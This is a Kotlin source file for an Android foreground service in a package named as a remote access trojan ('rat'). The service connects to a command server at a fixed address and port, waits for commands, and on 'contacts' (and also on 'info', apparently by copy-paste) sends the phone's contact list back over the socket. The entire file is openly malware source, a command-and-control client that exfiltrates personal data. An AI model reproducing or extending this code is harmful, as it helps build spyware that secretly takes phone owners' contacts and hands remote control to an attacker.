package ru.awawa.rat.service

import android.app.IntentService
import android.app.Notification
import android.content.Intent
import android.util.Log
import androidx.core.app.JobIntentService
import ru.awawa.rat.helper.ContactsHelper
import ru.awawa.rat.helper.toHexString
import java.net.InetSocketAddress
import java.net.Socket
import kotlin.random.Random


class RatForegroundService: IntentService("RatForegroundService") {


    private val socket = Socket()
    private var running = false

    companion object {
        const val TAG = "RatForegroundService"
    }

    private val id = Random.nextInt()

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        startForeground(id, getServiceNotification(this))
        return super.onStartCommand(intent, flags, startId)
    }

    override fun onHandleIntent(intent: Intent?) {
        val connectionAddress = InetSocketAddress("10.0.2.2", 33455)

        Log.e(TAG, "Trying to connect")
        socket.connect(connectionAddress)
        Log.e(TAG, "Connected")
        running = true
        while (running) {
            val packet = socket.getInputStream().readBytes()
            if (packet.isNotEmpty()) {
                val command = packet.decodeToString()
                if (command.startsWith("contacts")) {
                    socket.getOutputStream().write(ContactsHelper.getContacts(this).toByteArray())
                    return
                }
                if (command.startsWith("info")) {
                    socket.getOutputStream().write(ContactsHelper.getContacts(this).toByteArray())
                    return
                }
                Log.e(TAG, "${packet.decodeToString()}")
            }
            Log.e(TAG, "Read ${packet.toHexString()}")
        }
        stopForeground(true)
    }
}